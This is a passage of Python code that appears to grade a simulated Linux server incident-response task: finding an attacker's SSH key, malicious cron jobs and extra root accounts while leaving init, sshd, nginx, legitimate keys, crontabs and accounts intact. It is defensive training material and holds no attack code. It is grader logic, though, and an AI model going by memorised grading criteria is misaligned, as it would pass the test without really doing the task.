        g["match"] in line for path, lines in state["text_files"].items()
        if path.startswith(CRON_DIR) for line in lines),
    "no_extra_uid0": lambda state, g: _no_extra_uid0(state),
    "file_lacks": lambda state, g: not any(
        g["text"].lower() in line.lower() for line in state["text_files"].get(g["file"], [])),
}

# Processes that should never be killed while fixing something else.
PROTECTED = {
    "/sbin/init": "killed PID 1 (/sbin/init) — that takes down the whole machine",
    "sshd": "killed sshd — on a real server you just locked yourself out",
    "nginx": "killed nginx — the front door for every request, taken down on the way to fixing something else",
}


def collateral_issues(state: dict) -> set:
    issues = {reason for needle, reason in PROTECTED.items()
              if not any(needle in p["command"] for p in state["processes"])}
    text = state.get("text_files", {})
    if not any("ops@acme" in l for l in text.get("/root/.ssh/authorized_keys", [])):
        issues.add("deleted the ops team's legitimate SSH key along with the attacker's — the admins are now locked out")
    if f"{CRON_DIR}/root" not in text:
        issues.add("deleted root's crontab and its nightly backup job ('crontab -r' without -u removes YOUR OWN crontab)")
    if f"{CRON_DIR}/appsvc" not in text:
        issues.add("deleted appsvc's legitimate nightly report job along with the malicious one")
    for account in ("root", "deploy", "appsvc", "www-data", "postgres"):
        if "/etc/passwd" in text and not any(l.startswith(f"{account}:") for l in text["/etc/passwd"]):
            issues.add(f"deleted the real account '{account}' — the service or people using it are now broken")
    return issues


def describe_state(state: dict) -> list:
    return [
        f"You're logged into {state['hostname']} ({state['nproc']} CPUs, {state['mem_total_mb'] // 1024}GB RAM, "
        f"up {state['uptime_days']} days).",
        "Users are complaining. Two separate things are wrong on this box — find both, and fix them.",
    ]


def run_sandbox() -> None:
    run_loop("linux", "server", generate_state, handle_command, describe_state)
